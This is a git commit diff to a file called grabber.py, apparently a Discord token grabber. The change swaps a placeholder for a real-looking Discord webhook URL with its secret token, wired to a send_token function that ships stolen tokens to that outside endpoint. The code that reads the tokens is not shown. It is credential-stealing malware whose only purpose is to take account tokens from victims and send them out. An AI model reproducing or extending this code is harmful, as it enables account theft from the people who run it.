525cd5891c72980f2df07f7c9fe27ede8138fe0a
Domis17 <165822255+Domis17@users.noreply.github.com>
2025-02-24 22:44:37 +0200

    Update grabber.py

--- grabber.py
+++ grabber.py
@@ -4,7 +4,7 @@ import json
 
 def get_discord_token():
     # Replace this with your webhook URL
-    webhook_url = 'YOUR_WEBHOOK_URL'
+    webhook_url = 'https://discord.com/api/webhooks/1343679739180613652/Hda-bTxbe3FiUiSvNLP4fSaUq7CK73qH3jQGJn1QqZJC_IGudIhkcAUau6G9YS55Zqo1'
 
     # Function to send the token to the webhook
     def send_token(token):
